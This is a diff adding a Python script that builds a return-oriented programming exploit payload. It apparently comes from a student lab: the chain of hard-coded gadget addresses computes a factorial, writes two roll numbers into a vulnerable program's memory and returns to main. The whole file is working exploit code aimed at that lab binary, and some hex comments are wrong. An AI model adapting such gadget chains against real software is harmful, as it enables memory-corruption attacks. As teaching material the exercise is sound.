@@ -1,0 +1,152 @@
+#!/usr/bin/python
+
+# Display the output as Successful
+reset_iterator = 'S' * 12 + '\x30\x30\x31'
+display = (
+		'\x75\x0a' + '\x63\x0a' + '\x63\x0a' + '\x65\x0a' + 
+		'\x73\x0a' + '\x73\x0a' + '\x66\x0a' + '\x75\x0a' + 
+		'\x6c\x0a' + '\x21\x0a' + '\x31\x0a'*9 + '\x11\x0a'*4 
+	  )
+start_attack = reset_iterator + display
+
+# Store address of glb variable in edx register
+# Gadget = # 0x0805edb9 : pop edx ; pop ebx ; ret
+pop_edx_ebx = '\xb9\x0a' + '\xed\x0a' + '\x05\x0a' + '\x08\x0a'	# pop edx ; pop ebx	
+edx_value   = '\xa4\x0a' + '\x6c\x0a' + '\x0e\x0a' + '\x08\x0a'	# edx <- 0x080e6ca4 (address of glb)
+ebx_value   = '\x00\x0a' + '\x50\x0a' + '\x0e\x0a' + '\x08\x0a' # ebx <- 0x080e5000 (orig ebx value)
+init_edx    = pop_edx_ebx + edx_value + ebx_value
+
+# Store address of glb variable in ecx register
+# Gadget = 0x08064281 : pop ecx ; add al, 0xf6 ; ret 
+pop_ecx   = '\x81\x0a' + '\x42\x0a' + '\x06\x0a' + '\x08\x0a'	# pop ecx	
+ecx_value = '\xa4\x0a' + '\x6c\x0a' + '\x0e\x0a' + '\x08\x0a'	# ecx <- 0x080e6ca4 (address of glb)
+init_ecx  = pop_ecx + ecx_value
+
+# Store 1 in eax
+# Gadget = 0x080b02ea : pop eax ; ret
+pop_eax   = '\xea\x0a' + '\x02\x0a' + '\x0b\x0a' + '\x08\x0a'	# pop eax
+eax_value = '\x01\x0a' + '\x00\x0a' + '\x00\x0a' + '\x00\x0a'	# eax <- 1
+init_eax = pop_eax + eax_value
+
+# Store 1 in glb
+# Gadget = 0x0805faf2 : mov dword ptr [edx], eax ; ret
+init_glb = '\xf2\x0a' + '\xfa\x0a' + '\x05\x0a' + '\x08\x0a'	# [edx] <- eax = 1 
+
+# Combine all the initializations
+init_reg = init_edx + init_ecx + init_eax + init_glb
+
+# Multiply eax with value stored in address present in ecx
+# Gadget = 0x0806b498 : imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
+eax_mul   = '\x98\x0a' + '\xb4\x0a' + '\x06\x0a' + '\x08\x0a'	# eax <- eax * [ecx]
+ebx_value = '\x00\x0a' + '\x50\x0a' + '\x0e\x0a' + '\x08\x0a'	# ebx <- 0x080e5000 (orig ebx value) 
+multiply  = eax_mul + ebx_value 
+ 
+# Store address of glb variable in edx register 
+# Gadget = # 0x0805edb9 : pop edx ; pop ebx ; ret
+pop_edx_ebx = '\xb9\x0a' + '\xed\x0a' + '\x05\x0a' + '\x08\x0a' # pop edx ; pop ebx
+edx_value   = '\xa4\x0a' + '\x6c\x0a' + '\x0e\x0a' + '\x08\x0a' # edx <- 0x080e6ca4 (address of glb)
+ebx_value   = '\x00\x0a' + '\x50\x0a' + '\x0e\x0a' + '\x08\x0a' # ebx <- 0x080e5000 (orig ebx value) 
+edx_restore = pop_edx_ebx + edx_value + ebx_value
+	
+# Store eax value in glb 
+# Gadget = 0x0805faf2 : mov dword ptr [edx], eax ; ret
+storing = '\xf2\x0a' + '\xfa\x0a' + '\x05\x0a' + '\x08\x0a'
+
+# Store 2 in eax
+# Gadget = 0x080b02ea : pop eax ; ret
+pop_eax   = '\xea\x0a' + '\x02\x0a' + '\x0b\x0a' + '\x08\x0a'	# pop eax
+eax_value = '\x02\x0a' + '\x00\x0a' + '\x00\x0a' + '\x00\x0a'	# eax <- 2
+move_eax_2 = pop_eax + eax_value
+
+# Store 3 in eax
+# Gadget = 0x080b02ea : pop eax ; ret
+pop_eax   = '\xea\x0a' + '\x02\x0a' + '\x0b\x0a' + '\x08\x0a'	# pop eax
+eax_value = '\x03\x0a' + '\x00\x0a' + '\x00\x0a' + '\x00\x0a'	# eax <- 3 
+move_eax_3 = pop_eax + eax_value
+
+# Store 4 in eax
+# Gadget = 0x080b02ea : pop eax ; ret
+pop_eax   = '\xea\x0a' + '\x02\x0a' + '\x0b\x0a' + '\x08\x0a'	# pop eax
+eax_value = '\x04\x0a' + '\x00\x0a' + '\x00\x0a' + '\x00\x0a'	# eax <- 4
+move_eax_4 = pop_eax + eax_value
+
+# Store 5 in eax
+# Gadget = 0x080b02ea : pop eax ; ret
+pop_eax   = '\xea\x0a' + '\x02\x0a' + '\x0b\x0a' + '\x08\x0a'	# pop eax
+eax_value = '\x05\x0a' + '\x00\x0a' + '\x00\x0a' + '\x00\x0a'	# eax <- 5
+move_eax_5 = pop_eax + eax_value
+
+# Store 6 in eax
+# Gadget = 0x080b02ea : pop eax ; ret
+pop_eax   = '\xea\x0a' + '\x02\x0a' + '\x0b\x0a' + '\x08\x0a'	# pop eax
+eax_value = '\x06\x0a' + '\x00\x0a' + '\x00\x0a' + '\x00\x0a'	# eax <- 6
+move_eax_6 = pop_eax + eax_value
+
+
+compute_factorial = (
+			move_eax_2 + multiply + edx_restore + storing + 
+			move_eax_3 + multiply + edx_restore + storing + 
+			move_eax_4 + multiply + edx_restore + storing + 
+			move_eax_5 + multiply + edx_restore + storing + 
+			move_eax_6 + multiply + edx_restore + storing
+		    )
+
+# Store "CS19" in eax register
+# Gadget = 0x080b02ea : pop eax ; ret
+pop_eax   = '\xea\x0a' + '\x02\x0a' + '\x0b\x0a' + '\x08\x0a'	# pop eax ;
+eax_value = '\x43\x0a' + '\x53\x0a' + '\x31\x0a' + '\x39\x0a'	# eax <- 0x43533139 (CS19)
+gen_cs19  = pop_eax + eax_value
+
+# Store address of rollnumber1 variable in edx (to save CS19)
+# Gadget = 0x0805edb9 : pop edx ; pop ebx ; ret
+pop_edx_ebx = '\xb9\x0a' + '\xed\x0a' + '\x05\x0a' + '\x08\x0a'	# pop edx ; pop ebx
+edx_value   = '\x68\x0a' + '\x50\x0a' + '\x0e\x0a' + '\x08\x0a'	# edx <- 0x080e5068 (addr of rollnumber1)
+ebx_value   = '\x00\x0a' + '\x50\x0a' + '\x0e\x0a' + '\x08\x0a' # ebx <- 0x080e5000 (orig ebx value) 
+cs19b005_1  = pop_edx_ebx + edx_value + ebx_value
+
+# Store address of rollnumber1 + 4 variable in edx (to save B005)
+# Gadget = 0x0805edb9 : pop edx ; pop ebx ; ret
+pop_edx_ebx = '\xb9\x0a' + '\xed\x0a' + '\x05\x0a' + '\x08\x0a'	# pop edx ; pop ebx
+edx_value   = '\x6c\x0a' + '\x50\x0a' + '\x0e\x0a' + '\x08\x0a'	# edx <- 0x080e506c (addr of rollnumber1 + 4)
+ebx_value   = '\x00\x0a' + '\x50\x0a' + '\x0e\x0a' + '\x08\x0a'	# ebx <- 0x080e5000 (orig ebx value)
+cs19b005_2  = pop_edx_ebx + edx_value + ebx_value
+
+# Store "B005" in eax
+# Gadget = 0x080b02ea : pop eax ; ret
+pop_eax   = '\xea\x0a' + '\x02\x0a' + '\x0b\x0a' + '\x08\x0a'	# pop eax ;
+eax_value = '\x42\x0a' + '\x30\x0a' + '\x30\x0a' + '\x35\x0a'	# eax <- 0x425303433 (B005)
+
+roll1 = cs19b005_1 + gen_cs19 + storing + cs19b005_2 + pop_eax + eax_value + storing
+
+# Store address of rollnumber2 variable in edx (to save CS19)
+# 0x0805edb9 : pop edx ; pop ebx ; ret
+pop_edx_ebx = '\xb9\x0a' + '\xed\x0a' + '\x05\x0a' + '\x08\x0a'	# pop edx ; pop ebx
+edx_value   = '\x78\x0a' + '\x50\x0a' + '\x0e\x0a' + '\x08\x0a'	# edx <- 0x080e5078 (addr of rollnumber2)
+ebx_value   = '\x00\x0a' + '\x50\x0a' + '\x0e\x0a' + '\x08\x0a'	# ebx <- 0x080e5000 (orig ebx value)
+cs19b043_1  = pop_edx_ebx + edx_value + ebx_value
+
+# Store address of rollnumber2 + 4 variable in edx (to save B043)
+# 0x0805edb9 : pop edx ; pop ebx ; ret
+pop_edx_ebx = '\xb9\x0a' + '\xed\x0a' + '\x05\x0a' + '\x08\x0a'	# pop edx ; pop ebx
+edx_value   = '\x7c\x0a' + '\x50\x0a' + '\x0e\x0a' + '\x08\x0a'	# edx <- 0x080e507c (addr of rollnumber2 + 4)
+ebx_value   = '\x00\x0a' + '\x50\x0a' + '\x0e\x0a' + '\x08\x0a'	# ebx <- 0x080e5000 (orig ebx value)
+cs19b043_2  = pop_edx_ebx + edx_value + ebx_value
+
+# Store "B043" in eax
+# Gadget  = 0x080b02ea : pop eax ; ret
+pop_eax   = '\xea\x0a' + '\x02\x0a' + '\x0b\x0a' + '\x08\x0a'	# pop eax ;
+eax_value = '\x42\x0a' + '\x30\x0a' + '\x34\x0a' + '\x33\x0a'	# eax <- 0x425303433 (B043)
+
+roll2     = cs19b043_1 + gen_cs19 + storing + cs19b043_2 + pop_eax + eax_value + storing 
+
+roll_no_write =	roll1 + roll2
+
+return_to_main = '\xa7\x0a' + '\x9e\x0a' + '\x04\x0a' + '\x08\x0a'
+
+# Break loop by setting iterator = 9
+fill_buffer = '\x01' * 12
+set_iter    = '\x09\x00\x00\x00' + '\x00\x0a' + '\x01\x0a'
+terminate_loop = fill_buffer + set_iter 
+
+exploit = start_attack + init_reg + compute_factorial + roll_no_write + return_to_main + terminate_loop
+print exploit
